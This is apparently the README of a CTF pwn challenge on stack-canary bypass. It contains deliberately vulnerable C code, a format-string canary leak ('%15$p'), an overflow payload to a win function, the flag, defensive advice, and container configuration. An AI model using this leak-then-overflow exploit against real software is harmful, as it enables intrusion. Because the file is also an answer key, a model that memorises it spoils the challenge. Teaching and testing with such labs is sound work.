# pwn-canary-leak

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 中 |
| 考点 | 开启 canary 后的两段式利用：先泄露 canary，再溢出并在 payload 里原样填回 |
| 容器端口 | 宿主机 9108 → 容器 1337 |
| Flag | `flag{leak_the_canary_then_smash}` |

## 题面（直接复制到平台「简介」）

一个会把你发的东西原样回显的服务：先读一小段，回显，再读一段。用 `nc <地址> 9108` 连上去，先后两次输入都由你决定。目标：让程序执行那个会打印 flag 的函数。

**提示**：`checksec` 显示栈上多了一样东西，但它只在函数即将返回时才被检查；函数还没返回时，多读几个字节能看到什么？

## 二、题目描述

```c
void vuln(void) {
    char buf[64];
    read(0, buf, 63);        /* 第一次读，长度受限，canary 完好 */
    printf("echo: ");
    printf(buf);             /* 格式化串泄露 */
    printf("\n");
    read(0, buf, 0x200);     /* 第二次读，可以溢出 */
}
```

编译时加了 `-fstack-protector-all`，`vuln` 的 `rbp-8` 处有 canary（低字节恒为 `0x00`）。

## 三、解题步骤

1. 确认 canary：

```bash
checksec --file=files/pwn     # Stack: Canary found
objdump -d files/pwn | sed -n '/<vuln>:/,/ret/p'
```

```asm
401229: mov    rax,QWORD PTR fs:0x28     # 读 canary
401232: mov    QWORD PTR [rbp-0x8],rax   # 存到 rbp-8
...
401238: lea    rax,[rbp-0x50]            # buf
401249: call   4010d0 <read@plt>         # 只读 0x3f = 63 字节
401262: lea    rax,[rbp-0x50]            # printf(buf)
401266: mov    rdi,rax
40126e: call   4010c0 <printf@plt>
```

`buf` 在 `rbp-0x50`，canary 在 `rbp-0x8`，相距 `0x50-0x8 = 0x48 = 72` 字节。

2. 定位 canary 的位置参数下标：`printf(buf)` 调用时 `rsp = rbp-0x50`，`%6$p` 是 `buf[0..7]`，
   每 8 字节一个下标，canary 在 `buf+72` → `6 + 72/8 = 15`。

```python
p.send(b'%15$p')
```

写脚本时可以顺手扫一遍确认：

```python
p.send(b'|'.join(b'%%%d$p' % i for i in range(6, 25)))
# 找形如 0x....00 结尾（低字节为 00）的那个
```

3. 第二段构造 payload：`72 填充 + canary + saved rbp + win`。

```python
payload = b'A' * 72 + p64(canary) + p64(0) + p64(0x4011d6)
p.send(payload)
```

`saved rbp` 填什么都行（这里填 0），关键是 canary 必须**逐字节原样**填回。

4. 跑 exp：

```bash
python3 exp/exp.py
```

输出 `flag{...}`。

## 四、原理

`-fstack-protector` 在函数入口把 `fs:0x28` 处的 canary 存到 `[rbp-8]`，
函数返回前用 `xor` 比较，不一致就调用 `__stack_chk_fail` 终止进程。

canary 的最高有效字节是 `0x00`（防止字符串函数顺着读下去），所以 8 字节里实际随机的是低 7 字节。
`printf("%15$p")` 把它整体打印成十六进制，`int(x, 16)` 解析出来就是完整的 8 字节值，
低字节自然是 `00`。

溢出时把相同的值写回 `[rbp-8]`，比较就能通过，`ret` 才会执行被改写的返回地址。
先泄露、后溢出是 canary 保护的通用绕过模式：canary 只在函数返回时校验，函数内可以随便读。

## 五、防御建议

- 修掉格式化字符串（`printf("%s", buf)`），canary 就没有泄露点。
- 第一次 `read` 用 `sizeof buf` 而不是写死的 63，减少"刚好差一字节"的歧义。
- 打开 PIE，即使拿到 canary 也需要额外的代码/库基址泄露。
- 用 `-fstack-protector-all` + `-D_FORTIFY_SOURCE=3`。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键信息：`vuln = 0x40121d`，`win = 0x4011d6`，`buf = rbp-0x50`，canary 下标 `%15$p`，
canary 到返回地址间隔 = 72（buf→canary）+ 8（canary）+ 8（saved rbp）。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-canary-leak` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-canary-leak` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
